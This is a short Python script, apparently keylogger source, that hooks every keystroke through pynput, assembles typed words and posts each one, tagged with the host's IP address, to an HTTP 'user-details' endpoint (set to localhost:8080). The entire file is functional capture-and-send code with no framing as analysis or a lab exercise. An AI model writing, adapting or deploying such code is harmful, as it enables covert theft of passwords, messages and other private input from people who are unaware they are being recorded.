from pynput.keyboard import Key, Listener
import socket
from requests import post

currentString = ''


def append_string(character):
    global currentString
    currentString += character


def delete_last_character():
    global currentString
    new_string = ''
    for i in range(0, len(currentString) - 1):
        new_string += currentString[i]
    currentString = new_string


def get_ip_address():
    return socket.gethostbyname(socket.gethostname())


def prepare_body(ip_address, message):
    return {'ipAddress': ip_address, 'message': message}


def clear_string():
    global currentString
    currentString = ''


def post_message(message):
    host = 'localhost'
    port = '8080'
    endpoint = 'user-details'
    post(url="http://{}:{}/{}".format(host, port, endpoint), data=message)


def send_message(message):
    body = prepare_body(get_ip_address(), message)
    add_to_topic('keyboardInput1', body)
    post_message(body)


def add_to_topic(topic, message):
    print('Sent {} to topic {}'.format(message, topic))


def on_press(key):
    global currentString
    if is_whitespace(key):
        send_message(currentString)
        clear_string()
    elif key is Key.backspace:
        delete_last_character()
    else:
        append_string(str(key)[1])


def is_whitespace(key):
    return key in [Key.enter, Key.space, Key.tab]


with Listener(on_press=on_press) as listener:
    listener.join()
